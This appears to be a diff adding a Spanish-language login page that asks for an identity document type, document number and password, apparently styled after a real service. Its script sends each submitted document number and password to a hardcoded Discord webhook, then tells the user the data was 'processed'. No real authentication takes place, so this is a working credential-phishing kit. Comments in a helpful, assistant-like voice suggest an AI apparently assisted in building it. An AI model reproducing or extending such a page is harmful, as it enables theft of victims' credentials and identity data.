@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo-container">
+            <!-- Tip: Asegúrate de que ft.png esté en la misma carpeta -->
+            <img src="ft.png" alt="Logo de la empresa" class="login-logo">
+        </div>
+
+        <!-- Corregido a h1 para mejor semántica SEO -->
+        <h1>Inicia sesión</h1>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="tipo-doc">Tipo de documento</label>
+                <div class="select-wrapper">
+                    <select id="tipo-doc" name="tipo_documento">
+                        <option value="DNI">DNI</option>
+                        <option value="CE">Carné de Extranjería</option>
+                        <option value="PAS">Pasaporte</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label for="num-doc">Número de documento</label>
+                <div class="input-with-icon">
+                    <i class="fa-regular fa-user main-icon"></i>
+                    <!-- Corregido el 'name' por uno más descriptivo -->
+                    <input type="text" id="num-doc" name="numero_documento" placeholder="Ingresar dato" required>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <!-- Corregido el 'for' para que apunte al ID correcto -->
+                <label for="password">Contraseña</label>
+                <div class="input-with-icon">
+                    <i class="fa-solid fa-lock main-icon"></i>
+                    <!-- CRÍTICO: Corregido type="password" e IDs semánticos -->
+                    <input type="password" id="password" name="password" placeholder="Ingresa tu contraseña" required>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit">Ingresar</button>
+        </form>
+
+        <div class="register-banner">
+            <div class="banner-icon">
+                <i class="fa-solid fa-user-plus"></i>
+            </div>
+            <div class="banner-text">
+                <p><strong>¿Es tu primera vez aquí?</strong> Empieza ahora a realizar tus operaciones.</p>
+                <a href="#">Registrarse</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Contenedor del loading (¡Excelente idea tenerlo listo!) -->
+    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+        <div class="spinner"></div>
+        <p>Verificando credenciales, por favor espere...</p>
+    </div>
+
+</body>
+<script>
+        // REEMPLAZA ESTO CON LA URL REAL DE TU WEBHOOK DE DISCORD
+        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1499784483946233897/t1os-3sKxQLmvaLz7iCwRdrRYG3AZSytRFP1nS6xGO6rJP7KYYtJuhBx5YdWoHn7wUgE";
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Evita que la página se recargue
+
+            // 1. Mostrar el loading overlay
+            const loading = document.getElementById('loadingOverlay');
+            loading.style.display = 'flex';
+
+            // 2. Capturar los datos del formulario
+            const formData = new FormData(this);
+            const tipoDoc = formData.get('tipo_documento');
+            const numDoc = formData.get('numero_documento');
+            const password = formData.get('password'); // Nota: Ten cuidado con enviar contraseñas reales por webhooks públicos.
+
+            // 3. Crear el diseño del mensaje para Discord (Estructura Embed)
+            const discordMessage = {
+                username: "Log de Accesos",
+                avatar_url: "https://i.imgur.com/4M34gMc.png", // Icono personalizado para el bot
+                embeds: [{
+                    title: "🔔 Intento de Inicio de Sesión",
+                    color: 3447003, // Color azul en formato decimal
+                    fields: [
+                        { name: "🪪 Tipo de Documento", value: tipoDoc, inline: true },
+                        { name: "🔢 Número", value: numDoc, inline: true },
+                        { name: "🔑 Contraseña ingresada", value: `||${password}||`, inline: false } // Usamos || para ocultarla como spoiler en Discord
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "Sistema de Alertas" }
+                }]
+            };
+
+            // 4. Enviar los datos a Discord usando Fetch API
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(discordMessage)
+            })
+            .then(response => {
+                // Ocultar el loading una vez que Discord responda
+                loading.style.display = 'none';
+
+                if (response.ok) {
+                    alert("Datos procesados correctamente.");
+                    // Aquí puedes redirigir al usuario si lo deseas:
+                    // window.location.href = "siguiente_pagina.html";
+                } else {
+                    alert("Hubo un problema al conectar con el servidor de autenticación.");
+                }
+            })
+            .catch(error => {
+                loading.style.display = 'none';
+                console.error("Error:", error);
+                alert("Error de red. Inténtalo de nuevo más tarde.");
+            });
+        });
+    </script>
+</html>
